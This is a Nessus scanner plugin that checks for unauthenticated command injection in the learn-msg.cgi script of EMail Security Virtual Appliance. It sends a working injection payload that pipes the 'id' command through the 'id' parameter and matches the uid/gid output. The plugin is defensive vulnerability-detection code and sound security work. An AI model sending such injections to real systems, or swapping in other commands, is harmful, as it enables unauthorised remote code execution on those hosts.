#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(61996);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2013/05/09 19:43:37 $");

  script_bugtraq_id(55050);
  script_xref(name:"EDB-ID", value:"20551");

  script_name(english:"EMail Security Virtual Appliance learn-msg.cgi Remote Code Execution");
  script_summary(english:"Attempts to execute the id command");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an application that is affected by a remote
code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of EMail Security Virtual Appliance installed on the remote
host is affected by a code execution vulnerability in the 'id' parameter
of the 'learn-msg.cgi' script.  By exploiting this flaw, a remote,
unauthenticated attacker could execute arbitrary commands on the remote
host subject to the privileges of the web server hosting the affected
application. 

Note the installed version is also likely affected by a similar
vulnerability in the 'release-msg.cgi' script, though Nessus has not
tested for this.");
  script_set_attribute(attribute:"solution", value:"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"E-Mail Security Virtual Appliance 2.0.5 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'E-Mail Security Virtual Appliance learn-msg.cgi Command Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/08/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/09/06");
  
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2013 Tenable Network Security, Inc.");

  script_dependencies("esva_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/esva");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(appname:'esva', port:port, exit_on_fail:TRUE);
base_url = build_url(qs:install['dir'], port:port);

cmd = 'id';
http_check_remote_code(
  port:port,
  unique_dir:'/cgi-bin',
  check_request:'/learn-msg.cgi?id=|'+cmd+';',
  check_result:'uid=[0-9]+.*gid=[0-9]+.*',
  extra_check:'<meta http-equiv="refresh" content="0;URL=/learned.html">',
  command:cmd
);
audit(AUDIT_WEB_APP_NOT_AFFECTED, 'EMail Security Virtual Appliance', base_url);
